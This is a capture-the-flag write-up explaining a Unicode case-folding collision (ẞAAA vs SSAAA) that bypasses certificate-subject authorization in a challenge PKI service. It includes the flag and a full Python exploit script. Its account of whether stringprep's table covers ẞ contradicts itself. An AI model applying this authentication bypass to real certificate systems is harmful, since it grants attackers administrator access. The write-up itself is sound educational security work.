# CTF Solution: ASS (Administration Self-Service)

**Flag:** `NNS{rFC_3454_FR0z3_tHe_t4B1e_but_th3_uNiC0de_Kept_W4lK1n6_CR4ZY_Ri6H7}`

---

## Challenge Overview

A web PKI system that issues X.509 certificates. To get the flag you must authenticate to `/admin` as the administrator. The catch: ADMIN-profile certificates are stored server-side but their **private key is never returned**, so you can't sign the required nonce directly with the admin cert.

---

## Endpoints

| Endpoint | Description |
|---|---|
| `POST /certificates` | Issue a cert. ADMIN profile = no private key returned. CLIENT = private key returned. |
| `GET /auth/nonce` | Get a fresh nonce to sign. |
| `POST /admin` | Submit cert + nonce + signature. Returns flag if you are the admin. |

---

## Vulnerability

### The Authorization Check

```python
# app.py
authorized = ca.subject(presented) == ca.subject(administrator_certificate)
```

`ca.subject()` returns an `asn1crypto.x509.Name` object. The `==` operator on these objects uses **RFC 5280 / RFC 4518 string preparation** (`_ldap_string_prep`) for comparison, which includes:

1. **`stringprep.map_table_b2`** — Unicode case folding (RFC 3454 Table B.2)
2. **`unicodedata.normalize('NFKC', ...)`** — NFKC normalization

### The Collision

The name validation in `names.py` allows characters in the range `U+1E00–U+1EFF` (Latin Extended Additional) as long as they pass `.isalpha()` and `.isupper()`.

`U+1E9E` — **ẞ (LATIN CAPITAL LETTER SHARP S)** — is in this range and:
- `.isalpha()` → `True`
- `.isupper()` → `True`
- `map_table_b2(ẞ)` → **`"ss"`** (length-expanding fold: 1 char → 2 chars)

This means two **different strings** produce the **same prepped value**:

| Name | Length | Passes `is_acceptable` | Prepped value |
|------|--------|------------------------|---------------|
| `"ẞAAA"` | 4 | ✅ | `"ssaaa"` |
| `"SSAAA"` | 5 | ✅ | `"ssaaa"` |

Since `issued_names` stores the raw string, these don't collide in the deduplication check. But `asn1crypto` considers their certificate subjects **equal**.

### Root Cause

RFC 3454 (StringPrep) froze its case-folding tables at **Unicode 3.2**. `U+1E9E` (ẞ) was **added in Unicode 5.1 (2008)**, after RFC 3454 was published. So RFC 3454's Table B.2, as implemented by Python's `stringprep.map_table_b2`, does NOT have an entry for `U+1E9E` — it falls through to `str.lower()` which uses the **current Unicode version** and correctly folds `ẞ → ss`.

The flag hints at exactly this: *"RFC 3454 froze the table but the Unicode kept walking crazy right"*.

---

## Exploit Steps

1. **Register ADMIN cert** with name `"ẞAAA"` → server stores it, returns no private key.
2. **Register CLIENT cert** with name `"SSAAA"` → different raw string, passes dedup check, returns a private key.
3. **Get a nonce** from `/auth/nonce`.
4. **Sign the nonce** with the CLIENT private key.
5. **POST to `/admin`** with the CLIENT cert + nonce + signature.
6. The server compares subjects: `asn1crypto` preps both to `"ssaaa"` → **equal** → flag returned.

---

## Exploit Script

```python
#!/usr/bin/env python3
import base64, json, sys, urllib.request, urllib.error
from cryptography.hazmat.primitives.serialization import load_pem_private_key

BASE_URL    = "https://ass-b3bb1be07e6c.chall.nnsc.tf"
ADMIN_NAME  = "\u1E9EAAA"  # ẞAAA — preps to "ssaaa", no private key
CLIENT_NAME = "SSAAA"      # SSAAA — preps to "ssaaa", private key returned

def post_json(path, data):
    req = urllib.request.Request(
        BASE_URL + path, data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"}, method="POST"
    )
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())

def get_json(path):
    with urllib.request.urlopen(BASE_URL + path) as r:
        return json.loads(r.read())

# 1. Register admin (no private key returned)
admin_resp  = post_json("/certificates", {"profile": "ADMIN",  "name": ADMIN_NAME})
# 2. Register client (private key returned, same prepped subject)
client_resp = post_json("/certificates", {"profile": "CLIENT", "name": CLIENT_NAME})
# 3. Get nonce
nonce = get_json("/auth/nonce")["nonce"]
# 4. Sign nonce with client private key
key = load_pem_private_key(client_resp["private_key"].encode(), password=None)
sig = base64.b64encode(key.sign(nonce.encode())).decode()
# 5. Authenticate as admin
result = post_json("/admin", {
    "certificate": client_resp["certificate"],
    "nonce": nonce,
    "signature": sig,
})
print("FLAG:", result["flag"])
```

---

## Key Takeaway

Never use RFC 3454 / StringPrep (frozen at Unicode 3.2) to compare strings that may contain characters added in later Unicode versions. The sharp-S `ẞ` expansion (`ẞ → ss`) is a well-known edge case. Use a modern, version-aware Unicode comparison or restrict input to a safe ASCII subset.
